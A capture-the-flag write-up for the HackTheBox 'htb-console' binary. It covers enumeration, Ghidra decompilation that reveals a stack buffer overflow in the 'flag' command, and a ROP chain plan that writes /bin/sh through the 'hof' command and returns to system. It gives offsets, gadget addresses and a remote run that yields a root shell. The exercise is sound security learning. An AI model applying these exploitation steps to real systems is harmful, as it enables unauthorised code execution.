# htb-console

## Enumeration

Start with some basic file enumeration

```s
$ file htb-console 
htb-console: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=575e4055094a7f059c67032dd049e4fdbb171266, for GNU/Linux 3.2.0, stripped
$ pwn checksec htb-console 
[*] 'htb-console'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Looks like the application is stripped so we'll have to do some symbol discovery. The NX bit is also enabled so if we want code execution we'll have to perform ret2libc.

Lets discover the main function

```s
$ gdb -q htb-console                                
GEF for linux ready, type `gef' to start, `gef config` to configure
90 commands loaded and 5 functions added for GDB 13.1 in 0.00ms using Python engine 3.11
Reading symbols from htb-console...
(No debugging symbols found in htb-console)
gef➤  info file
Symbols from "htb-console".
Local exec file:
        `htb-console`, file type elf64-x86-64.
        Entry point: 0x4010b0
...<snip>...
gef➤  x/15i 0x4010b0
   0x4010b0:    endbr64
   0x4010b4:    xor    ebp,ebp
   0x4010b6:    mov    r9,rdx
   0x4010b9:    pop    rsi
   0x4010ba:    mov    rdx,rsp
   0x4010bd:    and    rsp,0xfffffffffffffff0
   0x4010c1:    push   rax
   0x4010c2:    push   rsp
   0x4010c3:    mov    r8,0x401480
   0x4010ca:    mov    rcx,0x401410
   0x4010d1:    mov    rdi,0x401397
   0x4010d8:    call   QWORD PTR [rip+0x2f0a]        # 0x403fe8
   0x4010de:    hlt
   0x4010df:    nop
   0x4010e0:    endbr64
gef➤  x/15i 0x401397
   0x401397:    push   rbp
   0x401398:    mov    rbp,rsp
   0x40139b:    sub    rsp,0x10
   0x40139f:    mov    eax,0x0
   0x4013a4:    call   0x401196
   0x4013a9:    lea    rdi,[rip+0xd78]        # 0x402128
   0x4013b0:    call   0x401030 <puts@plt>
   0x4013b5:    lea    rdi,[rip+0xd92]        # 0x40214e
   0x4013bc:    mov    eax,0x0
   0x4013c1:    call   0x401050 <printf@plt>
   0x4013c6:    mov    rdx,QWORD PTR [rip+0x2cc3]        # 0x404090 <stdin>
   0x4013cd:    lea    rax,[rbp-0x10]
   0x4013d1:    mov    esi,0x10
   0x4013d6:    mov    rdi,rax
   0x4013d9:    call   0x401080 <fgets@plt>
```

Looks like `main` starts at `0x401397`. Lets view this in Ghidra:

```c

void main(void)

{
  char cmd [16];
  
  nan_3();
  puts("Welcome HTB Console Version 0.1 Beta.");
  do {
    printf(">> ");
    fgets(cmd,16,stdin);
    execute_cmd(cmd);
    memset(cmd,0,0x10);
  } while( true );
}


```

Looks like the application takes some user input and passes it into `execute_cmd`. Lets view this function:

```c

void execute_cmd(char *param_1)

{
  int iVar1;
  char local_18 [16];
  
  iVar1 = strcmp(param_1,"id\n");
  if (iVar1 == 0) {
    puts("guest(1337) guest(1337) HTB(31337)");
  }
  else {
    iVar1 = strcmp(param_1,"dir\n");
    if (iVar1 == 0) {
      puts("/home/HTB");
    }
    else {
      iVar1 = strcmp(param_1,"flag\n");
      if (iVar1 == 0) {
        printf("Enter flag: ");
        fgets(local_18,48,stdin);
        puts("Whoops, wrong flag!");
      }
      else {
        iVar1 = strcmp(param_1,"hof\n");
        if (iVar1 == 0) {
          puts("Register yourself for HTB Hall of Fame!");
          printf("Enter your name: ");
          fgets(&hof_buf,10,stdin);
          puts("See you on HoF soon! :)");
        }
        else {
          iVar1 = strcmp(param_1,"ls\n");
          if (iVar1 == 0) {
            puts("- Boxes");
            puts("- Challenges");
            puts("- Endgames");
            puts("- Fortress");
            puts("- Battlegrounds");
          }
          else {
            iVar1 = strcmp(param_1,"date\n");
            if (iVar1 == 0) {
              system("date");
            }
            else {
              puts("Unrecognized command.");
            }
          }
        }
      }
    }
  }
  return;
}


```

Looks like there is a buffer overflow in the `fgets` call when we enter `flag`.

I initially thought that I had to perform a ret2libc. `system` is available in the GOT/PLT. However, there is a much simpler way to get code execution. There is already a call to `system` when we input the `date` command. With our buffer overflow we could directly jump to the address that calls `system`. Before we do that we'll need to pop the address of the string `/bin/sh`. This is tricky without knowing the version of libc this application is using. We could perform a ret2libc to perform a leak. Again, there is a much simpler solution. If we enter `hof`, we actually write 10 bytes to an address in the `bss` section. We can write `/bin/sh` to this address, pop the address into rdi, and then jump to `system`.

## Exploitation

First, we'll need to find the offset of the target buffer to the return address:

```s
gef➤  x/gx $rsp
0x7fffffffdc28: 0x6161616161616164
gef➤  pattern offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 24 (little-endian search) likely
[+] Found at offset 17 (big-endian search
```

Next, we'll determine the address for everything. The address of the memory address where `/bin/sh` will be writtin is `0x4040b0`. The address of the `system` call is `0x401381`. Lastly, the address of the rop gadget for `pop rdi` is `0x401473`.

Putting all this together gets a shell

```s
$ ./exploit.py REMOTE
[+] Opening connection to 188.166.171.200 on port 32704: Done
[*] Switching to interactive mode
Whoops, wrong flag!
$ id
uid=0(root) gid=0(root) groups=0(root)
```